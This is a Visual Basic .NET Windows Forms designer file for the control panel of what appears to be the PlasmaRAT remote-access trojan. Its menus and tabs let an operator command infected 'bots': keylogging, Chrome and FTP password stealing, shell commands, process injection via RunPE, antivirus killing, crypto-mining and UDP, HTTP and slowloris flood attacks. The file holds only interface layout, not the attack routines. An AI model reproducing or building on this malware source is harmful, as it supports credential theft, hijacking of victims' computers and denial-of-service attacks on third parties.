<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Main
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Main))
        Dim TreeNode97 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Execute File")
        Dim TreeNode98 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Update File")
        Dim TreeNode99 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Uninstall")
        Dim TreeNode100 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("General", New System.Windows.Forms.TreeNode() {TreeNode97, TreeNode98, TreeNode99})
        Dim TreeNode101 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Open Visible")
        Dim TreeNode102 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Open Hidden")
        Dim TreeNode103 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Website Visitor", New System.Windows.Forms.TreeNode() {TreeNode101, TreeNode102})
        Dim TreeNode104 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Run Bot Killer")
        Dim TreeNode105 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Run Hard BK")
        Dim TreeNode106 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Enable BK")
        Dim TreeNode107 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Disable BK")
        Dim TreeNode108 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Bot Killer", New System.Windows.Forms.TreeNode() {TreeNode104, TreeNode105, TreeNode106, TreeNode107})
        Dim TreeNode109 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Download Logs")
        Dim TreeNode110 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Search Logs")
        Dim TreeNode111 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Delete Logs")
        Dim TreeNode112 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Keylogger", New System.Windows.Forms.TreeNode() {TreeNode109, TreeNode110, TreeNode111})
        Dim TreeNode113 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Chrome Stealer")
        Dim TreeNode114 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("FTP Stealer")
        Dim TreeNode115 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Stealers", New System.Windows.Forms.TreeNode() {TreeNode113, TreeNode114})
        Dim TreeNode116 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("General Info")
        Dim TreeNode117 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("PC Specifications")
        Dim TreeNode118 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("AV Info")
        Dim TreeNode119 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Bot Info", New System.Windows.Forms.TreeNode() {TreeNode116, TreeNode117, TreeNode118})
        Dim TreeNode120 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Seed Torrent")
        Dim TreeNode121 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Shell Command")
        Dim TreeNode122 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Edit HOSTS File")
        Dim TreeNode123 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Inject via RunPE")
        Dim TreeNode124 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Inject via Reflection")
        Dim TreeNode125 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Advanced", New System.Windows.Forms.TreeNode() {TreeNode120, TreeNode121, TreeNode122, TreeNode123, TreeNode124})
        Dim TreeNode126 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Enable Mute")
        Dim TreeNode127 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Disable Mute")
        Dim TreeNode128 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Mute Bots", New System.Windows.Forms.TreeNode() {TreeNode126, TreeNode127})
        Dim ListViewItem4 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("1.5 Beta")
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.MainView = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.GeneralCollection = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExecuteFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.WebsiteVisitor = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenVisibleToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenHiddenToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Keylogger = New System.Windows.Forms.ToolStripMenuItem()
        Me.DownloadKeylogsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SearchKeylogsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteKeylogsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BotKiller = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunBotKillerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunHardBotKillerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator9 = New System.Windows.Forms.ToolStripSeparator()
        Me.EnableProactiveBotKillerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DisableProactiveBotKillerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Stealer = New System.Windows.Forms.ToolStripMenuItem()
        Me.ChromeStealerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FTPStealerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.BotInfo = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.StopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AVInfoToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AdvancedInfo = New System.Windows.Forms.ToolStripMenuItem()
        Me.SeedTorrentToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.StopToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator7 = New System.Windows.Forms.ToolStripSeparator()
        Me.InjectFileRunPEToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.InjectFileReflectionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator8 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripMenuItem15 = New System.Windows.Forms.ToolStripMenuItem()
        Me.StopMiningToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator10 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripMenuItem16 = New System.Windows.Forms.ToolStripMenuItem()
        Me.MuteBoats = New System.Windows.Forms.ToolStripMenuItem()
        Me.EnableMuteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DisableMuteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator3 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.TreeView2 = New System.Windows.Forms.TreeView()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.info = New System.Windows.Forms.Label()
        Me.use = New System.Windows.Forms.Label()
        Me.ListView3 = New System.Windows.Forms.ListView()
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Description = New System.Windows.Forms.Label()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.Button3 = New System.Windows.Forms.Button()
        Me.TextBox5 = New System.Windows.Forms.TextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Button2 = New System.Windows.Forms.Button()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.data = New System.Windows.Forms.TextBox()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.ListView2 = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.threads = New System.Windows.Forms.TextBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.time = New System.Windows.Forms.TextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.port = New System.Windows.Forms.TextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.target = New System.Windows.Forms.TextBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.SelectedOnly = New System.Windows.Forms.CheckBox()
        Me.bwflood = New System.Windows.Forms.RadioButton()
        Me.httppost = New System.Windows.Forms.RadioButton()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.condis = New System.Windows.Forms.RadioButton()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.arme = New System.Windows.Forms.RadioButton()
        Me.slowloris = New System.Windows.Forms.RadioButton()
        Me.httpget = New System.Windows.Forms.RadioButton()
        Me.UDP = New System.Windows.Forms.RadioButton()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.BotLogsRightClick = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ToolStripMenuItem5 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem6 = New System.Windows.Forms.ToolStripMenuItem()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.Commands = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ResendCommandToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SendCommandOnConnectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator5 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripMenuItem11 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem12 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator6 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripMenuItem13 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem14 = New System.Windows.Forms.ToolStripMenuItem()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.PasswordRightClick = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ToolStripMenuItem4 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem7 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator2 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripMenuItem8 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem10 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator4 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripMenuItem9 = New System.Windows.Forms.ToolStripMenuItem()
        Me.TabPage8 = New System.Windows.Forms.TabPage()
        Me.GroupBox9 = New System.Windows.Forms.GroupBox()
        Me.Button4 = New System.Windows.Forms.Button()
        Me.GroupBox10 = New System.Windows.Forms.GroupBox()
        Me.GPUMiner = New System.Windows.Forms.RadioButton()
        Me.CPUMiner = New System.Windows.Forms.RadioButton()
        Me.MinerFiles = New System.Windows.Forms.TextBox()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.Label14 = New System.Windows.Forms.Label()
        Me.MinerPool = New System.Windows.Forms.TextBox()
        Me.MinerPass = New System.Windows.Forms.TextBox()
        Me.Label15 = New System.Windows.Forms.Label()
        Me.MinerUser = New System.Windows.Forms.TextBox()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.TextBox7 = New System.Windows.Forms.TextBox()
        Me.SendMinerOnConnect = New System.Windows.Forms.CheckBox()
        Me.Button14 = New System.Windows.Forms.Button()
        Me.Button15 = New System.Windows.Forms.Button()
        Me.TabPage7 = New System.Windows.Forms.TabPage()
        Me.GroupBox13 = New System.Windows.Forms.GroupBox()
        Me.EnableBackupDNS = New System.Windows.Forms.CheckBox()
        Me.TestBackupDNS = New System.Windows.Forms.Button()
        Me.BackupDNS = New System.Windows.Forms.TextBox()
        Me.GroupBox7 = New System.Windows.Forms.GroupBox()
        Me.GlobalMessage = New System.Windows.Forms.TextBox()
        Me.Button16 = New System.Windows.Forms.Button()
        Me.GroupBox11 = New System.Windows.Forms.GroupBox()
        Me.Label20 = New System.Windows.Forms.Label()
        Me.Folder = New System.Windows.Forms.TextBox()
        Me.EnableInstallation = New System.Windows.Forms.CheckBox()
        Me.SetProcessCritical = New System.Windows.Forms.CheckBox()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.SetKernelObjectSecurity = New System.Windows.Forms.CheckBox()
        Me.FileName = New System.Windows.Forms.TextBox()
        Me.SWIP = New System.Windows.Forms.CheckBox()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.AutomaticBK = New System.Windows.Forms.CheckBox()
        Me.AVKiller = New System.Windows.Forms.CheckBox()
        Me.BotResourceProtection = New System.Windows.Forms.CheckBox()
        Me.GroupBox6 = New System.Windows.Forms.GroupBox()
        Me.Button8 = New System.Windows.Forms.Button()
        Me.Button6 = New System.Windows.Forms.Button()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.DNSBuild = New System.Windows.Forms.TextBox()
        Me.PORTBuild = New System.Windows.Forms.TextBox()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.Button13 = New System.Windows.Forms.Button()
        Me.TabPage6 = New System.Windows.Forms.TabPage()
        Me.GroupBox5 = New System.Windows.Forms.GroupBox()
        Me.GroupBox12 = New System.Windows.Forms.GroupBox()
        Me.LowBandwidth = New System.Windows.Forms.CheckBox()
        Me.PingPong = New System.Windows.Forms.CheckBox()
        Me.ClientOnError = New System.Windows.Forms.CheckBox()
        Me.SingleConnection = New System.Windows.Forms.CheckBox()
        Me.GroupBox8 = New System.Windows.Forms.GroupBox()
        Me.Label23 = New System.Windows.Forms.Label()
        Me.Button19 = New System.Windows.Forms.Button()
        Me.Button18 = New System.Windows.Forms.Button()
        Me.Button17 = New System.Windows.Forms.Button()
        Me.Label22 = New System.Windows.Forms.Label()
        Me.Label21 = New System.Windows.Forms.Label()
        Me.Button12 = New System.Windows.Forms.Button()
        Me.Button11 = New System.Windows.Forms.Button()
        Me.Button10 = New System.Windows.Forms.Button()
        Me.Button9 = New System.Windows.Forms.Button()
        Me.Button7 = New System.Windows.Forms.Button()
        Me.NewsView = New System.Windows.Forms.ListView()
        Me.ColumnHeader16 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader17 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.NewsHeader = New System.Windows.Forms.TextBox()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.Ping = New System.Windows.Forms.Timer(Me.components)
        Me.ToolTip1 = New System.Windows.Forms.ToolTip(Me.components)
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.BotsOnline = New System.Windows.Forms.ToolStripStatusLabel()
        Me.SelectedBots = New System.Windows.Forms.ToolStripStatusLabel()
        Me.BotPeak = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel3 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.StartListening = New System.Windows.Forms.ToolStripSplitButton()
        Me.ConnectionHelpToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PortForwardingTestToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BotListView = New PlasmaRAT.AeroListView()
        Me.ColumnHeader6 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader8 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader9 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader11 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader12 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader18 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.LogView = New PlasmaRAT.AeroListView()
        Me.ColumnHeader13 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader14 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.CommandsListView = New PlasmaRAT.AeroListView()
        Me.ColumnHeader10 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.PasswordListView = New PlasmaRAT.AeroListView()
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.MainView.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        Me.BotLogsRightClick.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.Commands.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        Me.PasswordRightClick.SuspendLayout()
        Me.TabPage8.SuspendLayout()
        Me.GroupBox9.SuspendLayout()
        Me.GroupBox10.SuspendLayout()
        Me.TabPage7.SuspendLayout()
        Me.GroupBox13.SuspendLayout()
        Me.GroupBox7.SuspendLayout()
        Me.GroupBox11.SuspendLayout()
        Me.GroupBox6.SuspendLayout()
        Me.TabPage6.SuspendLayout()
        Me.GroupBox5.SuspendLayout()
        Me.GroupBox12.SuspendLayout()
        Me.GroupBox8.SuspendLayout()
        Me.StatusStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "Actions-system-lock-screen-icon.png")
        Me.ImageList1.Images.SetKeyName(1, "application-add-icon.png")
        Me.ImageList1.Images.SetKeyName(2, "application-delete-icon.png")
        Me.ImageList1.Images.SetKeyName(3, "application-view-list-icon.png")
        Me.ImageList1.Images.SetKeyName(4, "Apps-Skype-icon.png")
        Me.ImageList1.Images.SetKeyName(5, "Apps-Skype-icon1.png")
        Me.ImageList1.Images.SetKeyName(6, "arrow-switch-090-icon.png")
        Me.ImageList1.Images.SetKeyName(7, "batch.png")
        Me.ImageList1.Images.SetKeyName(8, "batch1.png")
        Me.ImageList1.Images.SetKeyName(9, "bin-closed-icon.png")
        Me.ImageList1.Images.SetKeyName(10, "BSOD.png")
        Me.ImageList1.Images.SetKeyName(11, "bug.png")
        Me.ImageList1.Images.SetKeyName(12, "Button-Turn-Off-icon.png")
        Me.ImageList1.Images.SetKeyName(13, "chart-bar-icon.png")
        Me.ImageList1.Images.SetKeyName(14, "clan-bomber-icon.png")
        Me.ImageList1.Images.SetKeyName(15, "cmd.png")
        Me.ImageList1.Images.SetKeyName(16, "cog.png")
        Me.ImageList1.Images.SetKeyName(17, "cog_add.png")
        Me.ImageList1.Images.SetKeyName(18, "cog_delete.png")
        Me.ImageList1.Images.SetKeyName(19, "cog-icon.png")
        Me.ImageList1.Images.SetKeyName(20, "cogs-icon.png")
        Me.ImageList1.Images.SetKeyName(21, "computer-delete-icon.png")
        Me.ImageList1.Images.SetKeyName(22, "computer-error-icon.png")
        Me.ImageList1.Images.SetKeyName(23, "computer-go-icon.png")
        Me.ImageList1.Images.SetKeyName(24, "computer-icon.png")
        Me.ImageList1.Images.SetKeyName(25, "computer-icon1.png")
        Me.ImageList1.Images.SetKeyName(26, "cursor-icon.png")
        Me.ImageList1.Images.SetKeyName(27, "database-add-icon.png")
        Me.ImageList1.Images.SetKeyName(28, "database-connect-icon.png")
        Me.ImageList1.Images.SetKeyName(29, "database-delete-icon.png")
        Me.ImageList1.Images.SetKeyName(30, "database-delete-icon1.png")
        Me.ImageList1.Images.SetKeyName(31, "database-delete-icon2.png")
        Me.ImageList1.Images.SetKeyName(32, "database-error-icon.png")
        Me.ImageList1.Images.SetKeyName(33, "database-gear-icon.png")
        Me.ImageList1.Images.SetKeyName(34, "database-go-icon.png")
        Me.ImageList1.Images.SetKeyName(35, "database-lightning-icon.png")
        Me.ImageList1.Images.SetKeyName(36, "database-save-icon.png")
        Me.ImageList1.Images.SetKeyName(37, "Delete-icon.png")
        Me.ImageList1.Images.SetKeyName(38, "document_inspector.png")
        Me.ImageList1.Images.SetKeyName(39, "document-import-icon.png")
        Me.ImageList1.Images.SetKeyName(40, "drive.png")
        Me.ImageList1.Images.SetKeyName(41, "drive_cd.png")
        Me.ImageList1.Images.SetKeyName(42, "drive_cd_empty.png")
        Me.ImageList1.Images.SetKeyName(43, "drive_error.png")
        Me.ImageList1.Images.SetKeyName(44, "emotion_suprised.png")
        Me.ImageList1.Images.SetKeyName(45, "emotion_tongue.png")
        Me.ImageList1.Images.SetKeyName(46, "emotion_wink.png")
        Me.ImageList1.Images.SetKeyName(47, "eye-icon.png")
        Me.ImageList1.Images.SetKeyName(48, "fire-icon.png")
        Me.ImageList1.Images.SetKeyName(49, "firewall-burn-icon.png")
        Me.ImageList1.Images.SetKeyName(50, "floppy-icon.png")
        Me.ImageList1.Images.SetKeyName(51, "fps.png")
        Me.ImageList1.Images.SetKeyName(52, "html.png")
        Me.ImageList1.Images.SetKeyName(53, "icon.ico")
        Me.ImageList1.Images.SetKeyName(54, "icon-security-icon.png")
        Me.ImageList1.Images.SetKeyName(55, "IE-SZ-icon.png")
        Me.ImageList1.Images.SetKeyName(56, "ip-icon.png")
        Me.ImageList1.Images.SetKeyName(57, "key_a.png")
        Me.ImageList1.Images.SetKeyName(58, "key_e.png")
        Me.ImageList1.Images.SetKeyName(59, "key_t.png")
        Me.ImageList1.Images.SetKeyName(60, "key_z.png")
        Me.ImageList1.Images.SetKeyName(61, "keyboard_magnify.png")
        Me.ImageList1.Images.SetKeyName(62, "key-icon.png")
        Me.ImageList1.Images.SetKeyName(63, "key-icon1.png")
        Me.ImageList1.Images.SetKeyName(64, "lightning.png")
        Me.ImageList1.Images.SetKeyName(65, "Location-HTTP-icon.png")
        Me.ImageList1.Images.SetKeyName(66, "lock-icon.png")
        Me.ImageList1.Images.SetKeyName(67, "make-icon.png")
        Me.ImageList1.Images.SetKeyName(68, "map-magnify-icon.png")
        Me.ImageList1.Images.SetKeyName(69, "Misc-Database-3-icon.png")
        Me.ImageList1.Images.SetKeyName(70, "Misc-Settings-icon.png")
        Me.ImageList1.Images.SetKeyName(71, "mouse-select-right-icon.png")
        Me.ImageList1.Images.SetKeyName(72, "MSN-icon.png")
        Me.ImageList1.Images.SetKeyName(73, "My-Computer-icon.png")
        Me.ImageList1.Images.SetKeyName(74, "Sign-Info-icon.png")
        Me.ImageList1.Images.SetKeyName(75, "socket-minus-icon.png")
        Me.ImageList1.Images.SetKeyName(76, "socket-plus-icon.png")
        Me.ImageList1.Images.SetKeyName(77, "steam-icon.png")
        Me.ImageList1.Images.SetKeyName(78, "system-monitor-icon.png")
        Me.ImageList1.Images.SetKeyName(79, "System-Windows-icon.png")
        Me.ImageList1.Images.SetKeyName(80, "television.png")
        Me.ImageList1.Images.SetKeyName(81, "television_add.png")
        Me.ImageList1.Images.SetKeyName(82, "television_delete.png")
        Me.ImageList1.Images.SetKeyName(83, "tick.png")
        Me.ImageList1.Images.SetKeyName(84, "tick1.png")
        Me.ImageList1.Images.SetKeyName(85, "transmit-icon.png")
        Me.ImageList1.Images.SetKeyName(86, "usb-icon.png")
        Me.ImageList1.Images.SetKeyName(87, "Users-Folder-icon.png")
        Me.ImageList1.Images.SetKeyName(88, "vbs.png")
        Me.ImageList1.Images.SetKeyName(89, "Viseur.png")
        Me.ImageList1.Images.SetKeyName(90, "world_link.png")
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage1)
        Me.TabControl1.Controls.Add(Me.TabPage2)
        Me.TabControl1.Controls.Add(Me.TabPage4)
        Me.TabControl1.Controls.Add(Me.TabPage3)
        Me.TabControl1.Controls.Add(Me.TabPage5)
        Me.TabControl1.Controls.Add(Me.TabPage8)
        Me.TabControl1.Controls.Add(Me.TabPage7)
        Me.TabControl1.Controls.Add(Me.TabPage6)
        Me.TabControl1.ImageList = Me.ImageList1
        Me.TabControl1.Location = New System.Drawing.Point(-1, 1)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(645, 327)
        Me.TabControl1.TabIndex = 4
        '
        'TabPage1
        '
        Me.TabPage1.Controls.Add(Me.BotListView)
        Me.TabPage1.ImageIndex = 85
        Me.TabPage1.Location = New System.Drawing.Point(4, 23)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(637, 300)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Bots Online"
        Me.TabPage1.UseVisualStyleBackColor = True
        '
        'MainView
        '
        Me.MainView.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.GeneralCollection, Me.WebsiteVisitor, Me.Keylogger, Me.BotKiller, Me.Stealer, Me.ToolStripSeparator1, Me.BotInfo, Me.AdvancedInfo, Me.MuteBoats, Me.ToolStripSeparator3, Me.ToolStripMenuItem2, Me.ToolStripMenuItem3})
        Me.MainView.Name = "ContextMenuStrip1"
        Me.MainView.Size = New System.Drawing.Size(156, 236)
        '
        'GeneralCollection
        '
        Me.GeneralCollection.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ExecuteFileToolStripMenuItem, Me.UpdateToolStripMenuItem, Me.UninstallToolStripMenuItem})
        Me.GeneralCollection.Image = CType(resources.GetObject("GeneralCollection.Image"), System.Drawing.Image)
        Me.GeneralCollection.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.GeneralCollection.Name = "GeneralCollection"
        Me.GeneralCollection.Size = New System.Drawing.Size(155, 22)
        Me.GeneralCollection.Text = "General"
        '
        'ExecuteFileToolStripMenuItem
        '
        Me.ExecuteFileToolStripMenuItem.Name = "ExecuteFileToolStripMenuItem"
        Me.ExecuteFileToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.ExecuteFileToolStripMenuItem.Text = "Execute File"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'WebsiteVisitor
        '
        Me.WebsiteVisitor.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.OpenVisibleToolStripMenuItem, Me.OpenHiddenToolStripMenuItem})
        Me.WebsiteVisitor.Image = CType(resources.GetObject("WebsiteVisitor.Image"), System.Drawing.Image)
        Me.WebsiteVisitor.Name = "WebsiteVisitor"
        Me.WebsiteVisitor.Size = New System.Drawing.Size(155, 22)
        Me.WebsiteVisitor.Text = "Website Visitor"
        '
        'OpenVisibleToolStripMenuItem
        '
        Me.OpenVisibleToolStripMenuItem.Name = "OpenVisibleToolStripMenuItem"
        Me.OpenVisibleToolStripMenuItem.Size = New System.Drawing.Size(145, 22)
        Me.OpenVisibleToolStripMenuItem.Text = "Open Visible"
        '
